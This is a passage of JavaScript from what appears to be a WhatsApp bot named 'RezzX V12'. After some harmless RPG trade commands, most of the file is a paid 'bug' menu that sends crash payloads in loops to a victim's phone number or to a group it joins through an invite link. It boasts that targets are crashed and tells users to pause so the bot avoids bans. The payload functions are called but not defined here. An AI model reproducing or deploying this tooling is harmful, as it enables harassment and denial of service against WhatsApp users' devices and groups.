m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Bait Food* : ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit2334') {
    let noh = 200 * gambarnya;
    if (!args[1]) return m.reply(`Contoh: ${prefix + command} limit 2\n1 Limit = $200 Money`);
    if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini');
    kurangBalance(m.sender, noh, balance);
    var apalu = gambarnya * 1;
    let user = global.db.data.users
    user[m.sender].limit += apalu;
    setTimeout(async () => {
        m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Limit kamu:* `+ global.db.data.users[m.sender].limit`\n`);
    }, 2000);
} else { 
 m.reply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n3.limit\n\nExample: ${prefix + command} baitfood`)}
 }
 break
 
 case 'sell': case 'sel': case 'jual':{
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
  if (!text) return m.reply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
  var pertanyaan = args[1]
  if (args[0] === 'fish'){
  if (isIkan < pertanyaan) return m.reply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
  if (!args[1]) return m.reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = $10 Money`)
  sellFish(m.sender, pertanyaan)
 let monaynya = 15 * pertanyaan
 addBalance(m.sender, monaynya, balance)
 setTimeout( async () => {
  m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\nSisa Ikan : ` + util.format(getIkan(m.sender) ? getIkan(m.sender) : 0 + getMancingIkan(m.sender) ? getMancingIkan(m.sender) :0) + `\n`)
 }, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < pertanyaan) return m.reply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = $55 Money`)
 kurangAyam(m.sender, pertanyaan)
let monaynya = 55 * pertanyaan
 addBalance(m.sender, monaynya, balance)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Sisa Ayam* : ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < pertanyaan) return m.reply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = $70 Money`)
 kurangKelinci(m.sender, pertanyaan)
let monaynya = 70 * pertanyaan
 addBalance(m.sender, monaynya, balance)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Sisa kelinci* : ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < pertanyaan) return m.reply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = $90 money`)
 kurangDomba(m.sender, pertanyaan)
let monaynya = 90 * pertanyaan
 addBalance(m.sender, monaynya, balance)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Sisa domba* : ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < pertanyaan) return m.reply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = $100 Money\n\nLumayan lah buat kurban nanti😂`)
 kurangSapi(m.sender, pertanyaan)
let monaynya = 100 * pertanyaan
 addBalance(m.sender, monaynya, balance)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Sisa sapi* : ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < pertanyaan) return m.reply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = $40 Money`)
 kurangGajah(m.sender, pertanyaan)
let monaynya = 40 * pertanyaan
 addBalance(m.sender, monaynya, balance)
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Sisa gajah* : ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < pertanyaan) return m.reply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = $16 Money`)
 sellBesi(m.sender, pertanyaan)
let monaynya = 16 * pertanyaan
 addBalance(m.sender, monaynya, balance)
setTimeout( async () => {
m.reply(`Transaksi berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Sisa besi* : ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < pertanyaan) return m.reply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = $100 Money`)
 sellEmas(m.sender, pertanyaan)
let monaynya = 100 * pertanyaan
 addBalance(m.sender, monaynya, balance)
setTimeout( async () => {
m.reply(`Transaksi berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Sisa emas* : ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < pertanyaan) return m.reply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = $130 Money`)
 sellEmerald(m.sender, pertanyaan)
let monaynya = 130 * pertanyaan
 addBalance(m.sender, monaynya, balance)
setTimeout( async () => {
m.reply(`Transaksi berhasil ✅\n*Sisa uang* : ${getBalance(m.sender, balance)}\n*Sisa zamrud* : ${getEmerald(m.sender)}`)
}, 2000) 
 } else { 
m.reply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
 }
 }
 break
 
 case'buylimit':{
  if (isBan) return m.reply(mess.ban)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isPetualang) return m.reply(mess.rpg)
if (!text) return m.reply(`Contoh : ${prefix+command} 10\n\nHarga 1 limit = $50 balance`)
if (text.includes('-')) return m.reply(`Jangan menggunakan -`)
if (isNaN(text)) return m.reply(`Harus berupa angka`)
if (args[0] === 'infinity') return m.reply(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text))
if (isMonay < ane) return m.reply(`Uang kamu tidak mencukupi untuk pembelian ini`)
var bjir = ane * 50
kurangBalance(m.sender, bjir, balance)
let limit = bjir
let user = global.db.data.users
user[m.sender].limit += ane
m.reply(`Pembeliaan limit sebanyak ${text} berhasil\n\nSisa Balance : $${getBalance(m.sender, balance)}\nLimit yang di beli : ${text}`)
}
break

//==========BAGIAN MENU BUK========//

case 'rezzvip': case 'rezzv12':  case '☠️': case '🔥': case 'bissmilah-c1': case 'auto-mental': case 'ryoiki-tenkai':
if (!isPremium) return reply(`KHUSUS BABU REZZX 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`Bissmilah C1 - RezzX V12`)
for (let i = 0; i < amount; i++) {
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
}
reply(`Udah Ni , Coba Chat Target C1 apa C2 Semoga aja C1,Btw Jangan sering pake ya dijeda 2-5menit biar ga ke benet:v`)
break

case 'rezzxvip': case 'tembusipong': case 'tembusios': case 'sendpeler': case 'ga-ada-ampun': case 'spam-brutal': 
if (!isPremium && !isOwner) return reply(`KHUSUS BABU REZZX 😜`)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = q.split("|")[0]
amount = q.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`Bissmilah C1 - RezzX V12`)
for (let i = 0; i < amount; i++) {
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
sendBugIos(Pe)
sleep(1500)
}
reply(`Udah Ni , Coba Chat Target C1 apa C2 Semoga aja C1,Btw Jangan sering pake ya dijeda 2-5menit biar ga ke benet:v <  > Rezz X 4KHyren v11`)
break

//FITUR BUG V2
//bugditempat
case 'ripper-anjg': case 'assalamualaikum': case 'sv-gw-bang':  case 'bang-mau-nanya': case 'bang-aku-rezz': case 'kntl-kau': case 'misi-paket': {
m.reply ('Otw Bosku - RezzX V12')
await baklis(m.chat, ryobug)
await ngeloc(m.chat, force)
await pirgam(m.chat, ryobug)
await ngeloc(m.chat, force)
await penghitaman(m.chat, force2)
await ngeloc(m.chat, force)
await m.reply ('Mampus Kau Peler - RezzX')
}
break
 
 //bug nope+gc
case 'rezzgamon': case 'rezzxaby':  case 'biji-lu-pecah': {
if (!isPremium) return m.reply('Maaf Perintah Ini Khusus Pengguna Murbug Kami! Join Murbug Dulu Baru Bisa Akses😈')

if (!q) return m.reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await m.reply('_RezzX v12 - Waiting For Send Bug_')
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await m.reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'fatal-notip': case 'mode-lawak': case 'auto-mental': case 'rezzxv12': {
if (!isPremium) return m.reply('Ga Bisa Pake?Buy Prem Ke Rezz Biar Bisa Dipake')

if (!q) return m.reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await m.reply('_RezzX v12 - Waiting For Send Bug_')
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await m.reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'boomgc': case 'auto-crash-gc': case 'wargc': case 'killgc': case 'rezzx-mode-badut': case 'promosi-bkp': {
if (!isPremium) return m.reply(`Beli Akses Ke RezzX Murah 5K doang`)
if (!q) return m.reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
await m.reply(`_tunggu sampai gw bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let Pe = await rezzx.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
rezzx.sendMessage(Pe, {text: 'RezzX Nih Boss 😜 𓅋'}, {quoted:m})
rezzx.sendMessage(Pe, {text: 'RezzX Nih Boss 😜 𓅋'}, {quoted:m})
rezzx.sendMessage(Pe, {text: 'RezzX Nih Boss 😜 𓅋'}, {quoted:m})
rezzx.sendMessage(Pe, {text: 'RezzX Nih Boss 😜 𓅋'}, {quoted:m})
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
}
await m.reply(`_Sukses Bug Sudah Terkirim Ke Target😈_`)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
case 'bissmilah-out': case 'auto-mokad': case 'send-virus': case 'bubarin-gcnya': {
if (!isPremium) return m.reply(`Beli Akses Ke RezzX Murah 5K doang`)
if (!q) return m.reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
await m.reply(`_tunggu sampai gw bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let Pe = await rezzx.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
rezzx.sendMessage(Pe, {text: 'RezzX Nih Boss 😜 𓅋'}, {quoted:m})
rezzx.sendMessage(Pe, {text: 'RezzX Nih Boss 😜 𓅋'}, {quoted:m})
rezzx.sendMessage(Pe, {text: 'RezzX Nih Boss 😜 𓅋'}, {quoted:m})
rezzx.sendMessage(Pe, {text: 'RezzX Nih Boss 😜 𓅋'}, {quoted:m})
await baklis(Pe, ryobug)
await ngeloc(Pe, force)
await pirgam(Pe, ryobug)
await ngeloc(Pe, force)
await penghitaman(Pe, force2)
await ngeloc(Pe, force)
}
await m.reply(`_Sukses Bug Sudah Terkirim Ke Target😈_`)
await m.reply(`Done Bang Rezz Wkwkw Mampus dh gcnya`)
}
break
case 'bug-ios': case 'bug-ipong': case 'bug-pc': case 'bug-loc': {
if (!isPremium) return m.reply('Ga Bisa Pake?Buy Prem Ke Rezz Biar Bisa Dipake')

if (!q) return m.reply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
m.reply('_RezzX v12 - Waiting For Send Bug_')
for (let j = 0; j < jumlah; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await aipong(target)
await sleep(1500)
}
m.reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
case 'auto-delay-bug': case 'rezzx1': case 'rezzx2': case 'rezzx3': case 'rezzxinvinity': {
if (!isPremium) return m.reply('Ga Bisa Pake?Buy Prem Ke Rezz Biar Bisa Dipake')

if (!q) return m.reply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
m.reply('_RezzX v12 - Waiting For Send Bug_')
for (let j = 0; j < jumlah; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await aipong(target)
await sleep(1500)
}
m.reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
case 'full-crash-ip': case 'tembus-beta': {
if (!isPremium) return m.reply('Ga Bisa Pake?Buy Prem Ke Rezz Biar Bisa Dipake')

if (!q) return m.reply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
m.reply('_RezzX v12 - Waiting For Send Bug_')
for (let j = 0; j < jumlah; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await aipong(target)
await sleep(1500)
}
m.reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
 
default:
}
if (budy.startsWith('$')) {
if (!isOwner) return m.reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return m.reply(mess.owner)
if (!q) return 0
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
} catch (e) {
console.log(e)
    rezzx.sendMessage(`${owner}@s.whatsapp.net`, {text:`*LAPOR PAK BOSS ADA YANG ERROR DIBAGIAN :*\n${util.format(e)}`})
  }
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(chalk.redBright(`Update ${__filename}`))
  delete require.cache[file]
  require(file)
})